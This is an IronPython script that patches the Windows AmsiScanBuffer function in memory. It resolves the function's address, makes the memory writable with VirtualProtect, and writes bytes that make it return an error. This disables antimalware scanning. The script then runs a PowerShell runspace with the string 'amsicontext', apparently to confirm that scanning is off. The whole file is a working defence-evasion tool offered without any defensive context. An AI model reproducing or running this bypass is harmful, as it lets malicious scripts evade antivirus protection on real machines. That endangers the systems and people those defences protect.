import clr
import System
import os

clr.AddReference("System.Management.Automation")
from System.Management.Automation import Runspaces
import clrtype
from ctypes import *
import ctypes
from System import Convert, Text, Environment, IntPtr, UInt32
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import DllImportAttribute, PreserveSigAttribute, Marshal, HandleRef, CharSet
    
def bypass():
    windll.LoadLibrary("amsi.dll")

    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)

    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def main():
    bypass()
    runspace = Runspaces.RunspaceFactory.CreateRunspace()
    runspace.Open()
    scriptInvoker = RunspaceInvoke(runspace)
    pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(r"'amsicontext'")
    pipeline.Commands.Add("Out-String")
    output = pipeline.Invoke()
    for o in output:
        print(o)
    runspace.Close()

if __name__ == '__main__':
    main()